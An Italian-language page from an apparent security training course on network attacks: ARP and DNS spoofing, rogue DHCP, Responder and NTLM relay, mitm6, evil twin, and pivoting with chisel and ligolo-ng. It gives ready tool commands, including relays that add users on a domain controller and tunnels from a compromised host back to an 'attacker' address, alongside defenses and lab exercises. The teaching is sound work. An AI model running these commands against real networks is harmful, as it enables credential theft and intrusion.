@@ -1,0 +1,357 @@
+<!doctype html>
+<html lang="it">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<title>Network attacks: MITM, spoofing, pivoting — Cybersec Zero to Hero</title>
+<link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+<div class="app">
+  <aside class="sidebar">
+  <div class="sidebar-header">
+    <div class="brand">
+      <div class="brand-mark">&gt;_</div>
+      <div>
+        <div class="brand-title">CYBERSEC</div>
+        <div class="brand-subtitle">zero · to · hero</div>
+      </div>
+    </div>
+    <div class="lang-switch"><span class="lang-active" title="Italiano"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="10" height="20" fill="#009246"/><rect x="10" width="10" height="20" fill="#fff"/><rect x="20" width="10" height="20" fill="#ce2b37"/></svg> IT</span><a href="../en/pages/12-network-attacks.html" class="lang-link" title="Switch to English"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="30" height="20" fill="#012169"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#fff" stroke-width="3"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#c8102e" stroke-width="1.5"/><path d="M15,0 v20 M0,10 h30" stroke="#fff" stroke-width="5"/><path d="M15,0 v20 M0,10 h30" stroke="#c8102e" stroke-width="3"/></svg> EN</a></div>
+  </div>
+  <div class="search-wrap">
+    <div class="search-row">
+      <div class="search-inputwrap">
+        <span class="search-icon" aria-hidden="true">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="7"/>
+            <line x1="20" y1="20" x2="16.65" y2="16.65"/>
+          </svg>
+        </span>
+        <input class="search-input" id="search-input" type="text" placeholder="cerca... (premi /)" autocomplete="off" aria-label="Search">
+        <button class="search-clear" id="search-clear" type="button" aria-label="Clear" title="Clear">&times;</button>
+      </div>
+      <button class="search-btn" id="search-btn" type="button" aria-label="CERCA" title="CERCA">CERCA</button>
+    </div>
+    <div class="search-hits" id="search-hits" role="listbox"></div>
+  </div>
+  <div class="sidebar-nav">
+    <nav class="nav-section">
+      <div class="nav-section-title">Percorso</div>
+      <ul class="nav-list">
+        <li class="nav-item"><a href="../index.html"><span class="num">00</span>Home</a></li>
+        <li class="nav-item"><a href="../pages/00-percorso-e-mindset.html" class=""><span class="num">00</span>Percorso, mindset, etica e legge</a></li><li class="nav-item"><a href="../pages/00b-matematica-cs.html" class=""><span class="num">00b</span>Matematica e teoria computazione (il minimo, integrato)</a></li><li class="nav-item"><a href="../pages/01-fondamenti-informatica.html" class=""><span class="num">01</span>Fondamenti di informatica per la security</a></li><li class="nav-item"><a href="../pages/01b-assembly-zero.html" class=""><span class="num">01b</span>Assembly x86-64 e ARM64 da zero</a></li><li class="nav-item"><a href="../pages/02-linux-essenziale.html" class=""><span class="num">02</span>Linux essenziale per la security</a></li><li class="nav-item"><a href="../pages/02b-regex-automi.html" class=""><span class="num">02b</span>Regex, automi e parser per la security</a></li><li class="nav-item"><a href="../pages/03-networking-tcp-ip.html" class=""><span class="num">03</span>Networking: dai cavi a TCP/IP</a></li><li class="nav-item"><a href="../pages/04-http-tls.html" class=""><span class="num">04</span>HTTP, HTTPS e TLS in profondità</a></li><li class="nav-item"><a href="../pages/05-crittografia.html" class=""><span class="num">05</span>Crittografia: teoria e pratica</a></li><li class="nav-item"><a href="../pages/05b-crypto-worked-examples.html" class=""><span class="num">05b</span>Crittografia — esempi numerici passo-passo</a></li><li class="nav-item"><a href="../pages/06-os-internals.html" class=""><span class="num">06</span>OS internals: Linux e Windows in profondità</a></li><li class="nav-item"><a href="../pages/07-programmazione-security.html" class=""><span class="num">07</span>Programmazione per la security: Python, C, Go</a></li><li class="nav-item"><a href="../pages/08-osint-recon.html" class=""><span class="num">08</span>OSINT e ricognizione</a></li><li class="nav-item"><a href="../pages/09-scanning-enumeration.html" class=""><span class="num">09</span>Scanning, enumeration e fingerprinting</a></li><li class="nav-item"><a href="../pages/10-owasp-top10.html" class=""><span class="num">10</span>OWASP Top 10 e oltre — vulnerabilità web di base</a></li><li class="nav-item"><a href="../pages/10b-walkthrough-byte-per-byte.html" class=""><span class="num">10b</span>Walkthrough byte-per-byte: SQLi, XSS, SSRF, IDOR</a></li><li class="nav-item"><a href="../pages/11-web-avanzato.html" class=""><span class="num">11</span>Web hacking avanzato</a></li><li class="nav-item"><a href="../pages/12-network-attacks.html" class="active"><span class="num">12</span>Network attacks: MITM, spoofing, pivoting</a></li><li class="nav-item"><a href="../pages/13-active-directory.html" class=""><span class="num">13</span>Active Directory hacking</a></li><li class="nav-item"><a href="../pages/14-exploit-development.html" class=""><span class="num">14</span>Exploit development: dal buffer overflow a ROP</a></li><li class="nav-item"><a href="../pages/14b-bof-shell-completo.html" class=""><span class="num">14b</span>BoF → shell: exploit completo da zero</a></li><li class="nav-item"><a href="../pages/15-reverse-engineering.html" class=""><span class="num">15</span>Reverse engineering</a></li><li class="nav-item"><a href="../pages/16-malware-analysis.html" class=""><span class="num">16</span>Malware: tassonomia e analisi</a></li><li class="nav-item"><a href="../pages/17-mobile-security.html" class=""><span class="num">17</span>Mobile security: Android e iOS</a></li><li class="nav-item"><a href="../pages/18-cloud-security.html" class=""><span class="num">18</span>Cloud security: AWS, Azure, GCP</a></li><li class="nav-item"><a href="../pages/19-container-kubernetes.html" class=""><span class="num">19</span>Container e Kubernetes</a></li><li class="nav-item"><a href="../pages/20-wireless-radio.html" class=""><span class="num">20</span>Wireless e radio: WiFi, BT, SDR</a></li><li class="nav-item"><a href="../pages/21-hardware-firmware.html" class=""><span class="num">21</span>Hardware e firmware hacking</a></li><li class="nav-item"><a href="../pages/22-forensics-dfir.html" class=""><span class="num">22</span>Forensics e DFIR</a></li><li class="nav-item"><a href="../pages/23-blue-team-soc.html" class=""><span class="num">23</span>Blue team: SOC, SIEM, EDR, hunting</a></li><li class="nav-item"><a href="../pages/24-threat-intelligence.html" class=""><span class="num">24</span>Threat intelligence</a></li><li class="nav-item"><a href="../pages/25-grc-normative.html" class=""><span class="num">25</span>GRC, normative e standard</a></li><li class="nav-item"><a href="../pages/26-red-team.html" class=""><span class="num">26</span>Red team e adversary emulation</a></li><li class="nav-item"><a href="../pages/27-ai-ml-security.html" class=""><span class="num">27</span>AI / ML security</a></li><li class="nav-item"><a href="../pages/28-capstone-roadmap.html" class=""><span class="num">28</span>Capstone: CTF roadmap, home lab, certificazioni</a></li><li class="nav-item"><a href="../pages/29-master-cheatsheet.html" class=""><span class="num">29</span>Master cheatsheet</a></li><li class="nav-item"><a href="../pages/30-glossario-esteso.html" class=""><span class="num">30</span>Glossario esteso (250+ termini)</a></li><li class="nav-item"><a href="../pages/31-normative-it-ue.html" class=""><span class="num">31</span>Riferimenti normativi IT/UE in dettaglio</a></li>
+      </ul>
+    </nav>
+  </div>
+</aside>
+  <main class="main">
+    <div class="content">
+      <div class="page-meta">
+        <span class="pill">Network</span>
+        <span>Sezione 16 di 36</span>
+        <span class="level-tag level-adv">Livello: avanzato</span>
+      </div>
+      <h1>Network attacks: MITM, spoofing, pivoting</h1>
+      <p class="summary">ARP spoofing, DNS poisoning, DHCP rogue, evil twin, SSL strip, Responder/NTLM relay, IPv6 mitm6, pivoting con SSH/Chisel/Ligolo, port forwarding, SOCKS. Da una posizione nella rete a controllarne molta.</p>
+      <div class="info-card">
+  <div class="label">Area</div>
+  <div>Network</div>
+  <div class="label">Prerequisiti</div>
+  <ul class="source-list"><li>Sezione 03 (TCP/IP)</li><li>Sezione 04 (TLS)</li></ul>
+  <div class="label">Strumenti</div>
+  <ul class="source-list"><li>bettercap, ettercap, arpspoof</li><li>Responder, ntlmrelayx, mitm6</li><li>chisel, ligolo-ng, sshuttle</li><li>Wireshark</li><li>hostapd, hostapd-wpe</li></ul>
+</div>
+      <blockquote>
+<p>In una posizione di rete (LAN, WiFi, segmento interno) hai accesso a un coltello tagliente. La sicurezza del traffico cleartext crolla; molte autenticazioni Windows cadono. Capire questi attacchi è importante anche per difendere.</p>
+</blockquote>
+<h2 id="posizionarsi-nella-rete">Posizionarsi nella rete</h2>
+<p>Modi tipici di "essere in mezzo":
+- Cavo Ethernet in azienda (con NAC 802.1X disabilitato o bypassabile).
+- WiFi pubblico/aziendale (vedi sezione 20).
+- Rogue access point (evil twin).
+- Compromissione di un host (e poi "pivoting" interno).
+- VPN ottenuta (credenziali stolen, no MFA).
+- Container/VM nel datacenter di un'org.</p>
+<h2 id="arp-spoofing-e-mitm-in-lan">ARP spoofing e MITM in LAN</h2>
+<p>Già visto principio in sezione 3. Tool moderno: <strong>bettercap</strong>.</p>
+<pre><code class="language-bash">sudo bettercap -iface eth0
+# nel REPL:
+&gt; net.probe on        # scopre host nel segmento
+&gt; net.show
+&gt; set arp.spoof.fullduplex true
+&gt; set arp.spoof.targets 192.168.1.50      # la vittima
+&gt; arp.spoof on
+&gt; net.sniff on        # cattura
+&gt; http.proxy on       # MITM HTTP
+&gt; https.proxy on      # MITM HTTPS (con il proprio cert)
+</code></pre>
+<p>Senza il certificato della tua CA installato sulla vittima, HTTPS dà errore. Quindi MITM su HTTPS richiede:
+- Cert CA di bettercap importato (es. lab con BYOD).
+- Vittima ignora warning (raro, ma in scenari sociali...).
+- Bug nel client (vedi attacchi storici come ZombieLoad / NSLookup di cert errati).</p>
+<h3 id="caps-spec-sniffing">Caps spec sniffing</h3>
+<p>Anche solo passive, in LAN switched ARP-spoofed: tutto cleartext (HTTP, FTP, IMAP/POP3 senza TLS, syslog) finisce sotto il tuo Wireshark. Identifica password, token in URL, cookie, file scaricati.</p>
+<h3 id="difese">Difese</h3>
+<ul>
+<li><strong>DHCP snooping + DAI</strong> (Dynamic ARP Inspection) sugli switch enterprise.</li>
+<li><strong>NAC 802.1X</strong>: porta a connettersi serve auth.</li>
+<li><strong>VLAN segmentation</strong>.</li>
+<li><strong>Static ARP</strong> su host critici (server).</li>
+<li><strong>HSTS + HTTPS ovunque</strong>: rende MITM TLS molto più difficile.</li>
+<li><strong>DNSSEC + DoH/DoT</strong> per evitare DNS spoof.</li>
+</ul>
+<h2 id="dns-spoofingpoisoning">DNS spoofing/poisoning</h2>
+<p>In LAN con ARP spoof attivo, intercetta query DNS e rispondi con IP attaccante.</p>
+<pre><code class="language-bash"># in bettercap
+&gt; set dns.spoof.domains *.example.com
+&gt; set dns.spoof.address 192.168.1.99   # tuo IP
+&gt; dns.spoof on
+</code></pre>
+<p>Vittima naviga su example.com → finisce sul tuo server.</p>
+<p>Più realisticamente in red team: <strong>cache poisoning</strong> del resolver aziendale via Kaminsky-style (mitigato da source port random) o via <strong>subdomain takeover</strong> (CNAME punta a un servizio dismesso). Più frequente è il <strong>rogue DHCP</strong> che imposta DNS server attacker.</p>
+<h2 id="dhcp-rogue-starvation">DHCP rogue / starvation</h2>
+<pre><code class="language-bash"># Yersinia / mitm6 / Ettercap hanno modalità DHCP attack.
+# DHCP starvation: esaurisci il pool del DHCP legitimate
+&gt; dhcp6.spoof on
+</code></pre>
+<p>Una volta diventato DHCP server di una vittima → controlli IP, gateway, DNS, <strong>WPAD URL</strong>, NTP.</p>
+<h3 id="attacco-wpad">Attacco WPAD</h3>
+<p>WPAD (Web Proxy Auto-Discovery) cerca il file <code>wpad.dat</code> su <code>http://wpad/wpad.dat</code>. Se hai rogue DHCP/DNS → vittima fetcha il tuo wpad → tu sei proxy HTTP/S → MITM. Anche storicamente "Bad Tunnel" (CVE-2016-3213) abusava di WPAD via NetBIOS.</p>
+<h2 id="llmnr-nbt-ns-mdns-poisoning-con-responder">LLMNR / NBT-NS / mDNS poisoning con Responder</h2>
+<p>In rete Windows mal configurata, quando un host cerca <code>\\fileserver</code> ma DNS non risolve, fa <strong>fallback broadcast</strong>: LLMNR (UDP 5355) e NBT-NS (UDP 137). Chiunque sulla LAN può rispondere "sono io". Lo strumento canonico: <strong>Responder</strong>.</p>
+<pre><code class="language-bash">sudo responder -I eth0 -wv
+</code></pre>
+<p>Quando la vittima si autentica al tuo "fileserver" (sì, Windows lo fa di default con le sue credenziali correnti), ricevi un <strong>NTLMv2 challenge-response</strong>. Lo metti in hashcat:</p>
+<pre><code class="language-bash">hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>In 1 minuto su GPU, le password deboli vengono fuori.</p>
+<h3 id="ntlm-relay">NTLM Relay</h3>
+<p>Anziché crackare, <strong>inoltri</strong> l'autenticazione a un altro servizio dove l'utente ha accesso. Tool: <strong>ntlmrelayx.py</strong> (impacket).</p>
+<div class="mermaid">
+sequenceDiagram
+    autonumber
+    participant V as Vittima Windows<br/>(utente privilegiato)
+    participant A as Attacker<br/>(Responder + ntlmrelayx)
+    participant T as Target SMB/LDAP<br/>(es. Domain Controller)
+    V->>A: \\fakeserver\share (LLMNR / NBT-NS poison)
+    A->>T: connect SMB/LDAP, "voglio autenticarmi"
+    T->>A: CHALLENGE
+    A->>V: stesso CHALLENGE
+    V->>A: RESPONSE (NTLMv2 con hash di V)
+    A->>T: RESPONSE (relay del valore)
+    T->>A: AUTH OK come V
+    Note over A: Ora ha sessione su T<br/>con privilegi di V
+    A->>T: dump SAM / DCSync / addUser / RBCD
+
+</div>
+
+<pre><code class="language-bash">sudo impacket-ntlmrelayx -tf targets.txt -smb2support
+</code></pre>
+<p>Combinato con Responder, l'utente NTLM finisce relayato a un server SMB dove ha accesso → tu prendi comando di quel server.</p>
+<p>Per essere coronato:
+- SMB signing disabilitato sul target (SMB1/SMB2 senza signing) o SMB signing abilitato ma non <em>required</em> per relay attivo.
+- Spesso bersagliato: SMB → Domain Controller (DCSync), LDAP → AD WriteAccess, MSSQL.</p>
+<h3 id="mitigazione-llmnrnbt-ns">Mitigazione LLMNR/NBT-NS</h3>
+<ul>
+<li><strong>Disabilita LLMNR</strong> (GPO).</li>
+<li><strong>Disabilita NBT-NS</strong> (PowerShell o GPO via NetBIOS over TCP/IP "Disabled").</li>
+<li><strong>SMB signing required</strong> ovunque.</li>
+<li><strong>Channel binding (EPA)</strong> per LDAP/HTTP.</li>
+<li>Difese in Windows 11/Server 2022: SMB over QUIC, LDAP signing, NTLM relay protection.</li>
+</ul>
+<h2 id="ipv6-attacks-con-mitm6">IPv6 attacks con mitm6</h2>
+<p>Anche se non usi IPv6, ce l'hai abilitato e Windows lo preferisce. <strong>mitm6</strong> sfrutta DHCPv6 per registrare lui stesso come DNS server della vittima.</p>
+<pre><code class="language-bash">sudo mitm6 -d example.local
+sudo ntlmrelayx -6 -wh wpad.example.local -t ldaps://dc.example.local
+</code></pre>
+<p>Risultato: vittima cerca WPAD via tuo DNS → fa auth NTLM → relayata a LDAPS sul DC → tu crei un utente nuovo o aggiungi un membro a un gruppo privilegiato.</p>
+<h3 id="mitigazione">Mitigazione</h3>
+<ul>
+<li><strong>Disabilita IPv6</strong> se davvero non lo usi (e capisci le conseguenze) o</li>
+<li><strong>DHCPv6 guard</strong> sugli switch + RA guard.</li>
+<li><strong>LDAP signing + channel binding</strong> sui DC.</li>
+</ul>
+<h2 id="ssl-strip-storico">SSL strip (storico)</h2>
+<p>L'attaccante MITM. Vittima fa <code>GET http://bank.com</code>, server redirige a <code>https://bank.com</code>. Attaccante: lascia HTTP, dialoga in HTTPS col server, riscrive contenuti. Vittima non vede il lucchetto.</p>
+<p>Mitigazione: <strong>HSTS</strong> (e meglio se in preload list).</p>
+<h2 id="evil-twin-wifi">Evil twin WiFi</h2>
+<p>Crei un AP con stesso SSID dell'aziendale o dell'hotel. I device che hanno la rete salvata si attaccano al più potente.</p>
+<p>Tool: <strong>hostapd</strong>, <strong>WiFi Pumpkin 3</strong>, <strong>airgeddon</strong>.</p>
+<p>Combinato con captive portal phishing-flavored → credential harvesting.</p>
+<p>In WPA2-Enterprise (802.1X EAP) → <strong>EAP downgrade attacks</strong> (<code>hostapd-wpe</code> con cert self-signed → MS-CHAPv2 handshake catturato → <code>asleap</code>/<code>crack.sh</code> per recuperare NT hash).</p>
+<p>Dettagli in sezione 20.</p>
+<h2 id="pivoting-larte-del-muovere">Pivoting — l'arte del muovere</h2>
+<p>Da un foothold (host compromesso) raggiungere host non instradabili da fuori.</p>
+<h3 id="ssh-dynamic-tunnel-socks5">SSH dynamic tunnel (SOCKS5)</h3>
+<p>Già visto. La tua attacker box ha SSH legitime nella rete vittima → <code>ssh -D 1080 user@compromised</code>. Configurazione proxychains o foxyproxy → tutto il tuo traffico passa per il proxy.</p>
+<pre><code class="language-bash"># /etc/proxychains.conf
+[ProxyList]
+socks5 127.0.0.1 1080
+</code></pre>
+<pre><code class="language-bash">proxychains nmap -sT -Pn 10.10.50.0/24
+proxychains curl http://10.10.50.5:8080
+</code></pre>
+<h3 id="localremote-ssh-forwarding">Local/Remote SSH forwarding</h3>
+<ul>
+<li><strong>Local (-L)</strong>: porta locale → host remoto. <code>ssh -L 8080:internal-app:80 user@jump</code>.</li>
+<li><strong>Remote (-R)</strong>: porta sul jump → tuo localhost. Utile per esporre un servizio sulla tua attacker macchina al jump server.</li>
+</ul>
+<h3 id="chisel">chisel</h3>
+<p>Server/client in Go. Stabilisce un tunnel su HTTP/WebSocket → bypassa egress filtering basato solo su porte.</p>
+<pre><code class="language-bash"># server (sulla tua attacker VPS o Kali)
+chisel server -p 8000 --reverse
+
+# client (su compromised host)
+chisel client http://attacker:8000 R:1080:socks
+</code></pre>
+<p>Crea un tunnel reverse SOCKS5: ti connetti al tuo localhost:1080 e attraversi la rete interna.</p>
+<h3 id="ligolo-ng-moderno-perche-supera-proxychains">ligolo-ng (moderno) — perché supera proxychains</h3>
+<p><strong>Problema con proxychains/SOCKS</strong>: ogni tool che usi deve <strong>sapere parlare SOCKS</strong> (alcuni sì come curl <code>--socks5</code>, altri no come <code>arping</code>, <code>mtr</code>, traceroute raw). proxychains <em>intercetta</em> le syscall <code>connect()</code> e le redirige, ma:
+- non gestisce ICMP (niente ping/traceroute).
+- non gestisce raw socket (niente sniffing).
+- non gestisce UDP (a meno di SOCKS5 con UDP, raramente supportato).
+- ogni tool a volte chiude e riapre connessioni → lento.</p>
+<p><strong>ligolo-ng</strong> risolve <strong>a livello L3</strong>: crea una <strong>tun interface</strong> sulla tua Kali, e quando ci routi traffico, il kernel lo manda nel tunnel WireGuard-like fino all'agent compromesso, che lo "spedisce" come traffico vero della rete interna.</p>
+<h4 id="cose-una-tun-interface-la-parte-sottintesa">Cos'è una tun interface (la parte sottintesa)</h4>
+<p>Una <strong>tun interface</strong> è una <strong>scheda di rete virtuale</strong> vista dal kernel come una NIC normale. Differenza:
+- <strong>tap</strong> = livello 2 (Ethernet frame).
+- <strong>tun</strong> = livello 3 (pacchetto IP).</p>
+<p>Quando il kernel scrive su <code>tun0</code>, il pacchetto non finisce su un cavo: arriva a <strong>un processo userland</strong> che ha aperto <code>/dev/net/tun</code>. Quel processo decide cosa farci (forward, log, mangle, tunnel).</p>
+<div class="mermaid">
+flowchart LR
+    APP[curl / nmap / ping] -->|usa socket| K1[Kernel routing table]
+    K1 -->|"10.10.50.0/24 dev ligolo"| TUN[tun interface ligolo]
+    TUN -->|read da userspace| LP[ligolo-ng proxy]
+    LP -->|TLS over TCP| LA[ligolo-ng agent<br/>su compromised]
+    LA --> INT[rete interna 10.10.50.0/24]
+
+</div>
+
+<h4 id="setup-ligolo-ng-a-30-secondi">Setup ligolo-ng a 30 secondi</h4>
+<pre><code class="language-bash"># attacker
+./ligolo-ng -selfcert
+# (REPL: session, start)
+
+# agent on victim
+./agent -connect attacker:11601 -ignore-cert
+</code></pre>
+<p>Sulla tua macchina vedi una nuova interface; <code>ip route add 10.10.50.0/24 dev ligolo</code> → tutti i tuoi tool funzionano come se fossi dentro. <strong>Game changer</strong> rispetto a proxychains: niente più "questo tool non supporta SOCKS".</p>
+<h3 id="sshuttle-poor-mans-vpn-su-ssh">sshuttle (poor man's VPN su SSH)</h3>
+<pre><code class="language-bash">sshuttle -r user@jump 10.10.0.0/16
+</code></pre>
+<p>VPN-like su SSH, senza richiedere root sul remoto (solo sul client).</p>
+<h3 id="pivoting-windows">Pivoting Windows</h3>
+<ul>
+<li><strong>netsh portproxy</strong>: <code>netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connectport=445 connectaddress=10.10.50.5</code>.</li>
+<li><strong>PowerShell Invoke-PortFwd</strong>.</li>
+<li><strong>plink</strong> (PuTTY CLI) per SSH dinamico da Windows compromesso.</li>
+<li><strong>Cobalt Strike SOCKS</strong>, <strong>Sliver pivoting</strong>.</li>
+</ul>
+<h2 id="bluetooth-zigbee-ble-4g-cenni">Bluetooth / Zigbee / BLE / 4G (cenni)</h2>
+<p>Sezione 20 li approfondisce. Concetti:
+- BLE pairing modes (Just Works, Passkey, OOB) — Just Works è MITM-able.
+- BlueBorne (2017), BIAS, KNOB.
+- Zigbee key exchange in clear (in alcune implementazioni).
+- IMSI catcher (Stingray) — illegali in molte giurisdizioni.</p>
+<h2 id="esercizi">Esercizi</h2>
+<h3 id="esercizio-121-arp-spoofing-in-lab">Esercizio 12.1 — ARP spoofing in lab</h3>
+<p>In lab isolato con 3 VM (attacker, vittima, gateway):
+1. Da attacker, <code>bettercap -iface eth0</code>, attiva arp.spoof.
+2. Su vittima, <code>arp -a</code> prima e dopo. Cosa cambia?
+3. Da attacker <code>net.sniff</code>. Genera traffico HTTP sulla vittima. Lo vedi?
+4. Su vittima, abilita "Static ARP entry" per il gateway. L'attacco continua?</p>
+<h3 id="esercizio-122-responder-crack">Esercizio 12.2 — Responder + crack</h3>
+<p>In lab con un Domain Controller + workstation:
+1. Lancia <code>responder -I eth0</code> su attacker.
+2. Su workstation, accedi a <code>\\fakeserver\share</code> (deve fallire, ma genera la query).
+3. Cattura NTLMv2 hash.
+4. <code>hashcat -m 5600 -a 0 hashes.txt rockyou.txt</code>.
+5. Quanti hash deboli vengono crackati?</p>
+<h3 id="esercizio-123-ntlm-relay">Esercizio 12.3 — NTLM relay</h3>
+<p>Sempre in lab AD:
+1. Setup: SMB signing <strong>non</strong> required su una workstation (config GPO).
+2. <code>ntlmrelayx -tf targets.txt -smb2support</code>.
+3. <code>responder</code> con <code>-r off -P off -d off</code> (disabilita SMB su Responder, lo gestisce ntlmrelayx).
+4. Trigga il login: l'utente compromesso ottieni dump SAM remoto o esegui commands.</p>
+<h3 id="esercizio-124-mitm6-relay">Esercizio 12.4 — mitm6 + relay</h3>
+<p>Lab AD. Esegui:</p>
+<pre><code class="language-bash">sudo mitm6 -d example.local --no-ra
+sudo ntlmrelayx -6 -wh wpad.example.local -t ldaps://dc.example.local --add-user
+</code></pre>
+<p>Spiega cosa succede. Quale azione fa <code>--add-user</code>?</p>
+<h3 id="esercizio-125-pivoting-con-chisel">Esercizio 12.5 — Pivoting con chisel</h3>
+<p>Setup:
+- Attacker: 192.168.1.10 (Kali).
+- Pivot host: 192.168.1.20 (compromised).
+- Internal: 10.10.50.0/24 (raggiungibile solo dal pivot).</p>
+<p>Setup chisel reverse SOCKS dal pivot al Kali. Da Kali, <code>proxychains nmap -sT 10.10.50.5</code>. Funziona?</p>
+<h3 id="esercizio-126-ligolo-ng-end-to-end">Esercizio 12.6 — ligolo-ng end to end</h3>
+<p>Stesso scenario. Setup ligolo-ng tun mode. Dalla Kali, accedi a un servizio HTTP su 10.10.50.5:8080 <em>senza</em> proxychains. Differenza pratica?</p>
+<h3 id="esercizio-127-tryhackme-rooms">Esercizio 12.7 — TryHackMe rooms</h3>
+<ul>
+<li>"Mr Robot" — buona pratica AR/network.</li>
+<li>"Wreath" — pivoting esplicito.</li>
+<li>"Network Services" / "Network Services 2".</li>
+</ul>
+<h3 id="esercizio-128-detection-lato-blue-team">Esercizio 12.8 — Detection lato blue team</h3>
+<p>Su una rete con Suricata IDS, configura regole per:
+- ARP anomaly (più di 5 gratuitous ARP/min da stesso MAC).
+- LLMNR/NBT-NS attivi.
+- DHCPv6 unexpected.
+- Outbound chisel/ligolo over HTTP/WebSocket (signature distintive?).</p>
+<p>Discuti: quale di questi è facile detectare? Quale praticamente invisibile?</p>
+<h2 id="concetti-chiave">Concetti chiave</h2>
+<ol>
+<li><strong>In LAN switched</strong>, ARP è la chiave per "essere in mezzo".</li>
+<li><strong>Responder + ntlmrelayx</strong> sono il pane di pentest interno Windows.</li>
+<li><strong>LLMNR/NBT-NS/mDNS</strong> → disabilitare in Windows enterprise.</li>
+<li><strong>IPv6 mitm6</strong> spesso ignorato → game-over in AD.</li>
+<li><strong>Pivoting moderno: chisel + ligolo</strong> — superano proxychains.</li>
+<li><strong>SMB signing required + LDAP signing + channel binding</strong> = base hardening AD anti-relay.</li>
+<li><strong>HTTPS+HSTS</strong> rende MITM L7 difficile; resta L2/L3 e l'auth.</li>
+</ol>
+<p>Avanti: il mondo Active Directory in dettaglio.</p>
+      <nav class="pager">
+<a href="11-web-avanzato.html" class="prev"><span class="label">← Precedente</span><span class="title">Web hacking avanzato</span></a>
+<a href="13-active-directory.html" class="next"><span class="label">Successivo →</span><span class="title">Active Directory hacking</span></a>
+</nav>
+      <footer class="page-footer">
+        <p><strong>Cybersec Zero to Hero</strong> — percorso completo di sicurezza informatica, dall'inizio alla maestria.</p><p>Materiale a scopo educativo. Tutto ciò che impari va usato solo su sistemi che possiedi, in laboratori, in programmi di bug bounty autorizzati o sotto contratto di pentest. <strong>Non rompere la legge.</strong></p>
+      </footer>
+    </div>
+  </main>
+</div>
+<script src="../search-data.js"></script>
+<script src="../search.js"></script>
+<script src="../toc.js"></script>
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+  mermaid.initialize({
+    startOnLoad: true,
+    theme: 'base',
+    themeVariables: {
+      darkMode: true, background: '#131a1e', primaryColor: '#1d262b',
+      primaryTextColor: '#e8eef0', primaryBorderColor: '#00ff9c',
+      lineColor: '#00e6ff', secondaryColor: '#11171a', tertiaryColor: '#161d21',
+      mainBkg: '#1d262b', nodeBorder: '#00ff9c', clusterBkg: '#0b0f10',
+      clusterBorder: '#243035', titleColor: '#00ff9c',
+      edgeLabelBackground: '#0b0f10', textColor: '#e8eef0',
+      labelTextColor: '#e8eef0', actorBkg: '#1d262b', actorBorder: '#00ff9c',
+      actorTextColor: '#00ff9c', actorLineColor: '#00e6ff',
+      signalColor: '#e8eef0', signalTextColor: '#e8eef0',
+      labelBoxBkgColor: '#1d262b', labelBoxBorderColor: '#00ff9c',
+      noteBkgColor: '#ffe066', noteTextColor: '#0b0f10', noteBorderColor: '#ffe066',
+      activationBkgColor: '#1d262b', activationBorderColor: '#00ff9c',
+      sequenceNumberColor: '#0b0f10'
+    },
+    flowchart: { curve: 'basis', padding: 16 },
+    sequence: { mirrorActors: false, bottomMarginAdj: 10 },
+    fontFamily: 'JetBrains Mono, Cascadia Code, Consolas, monospace'
+  });
+</script>
+</body>
+</html>
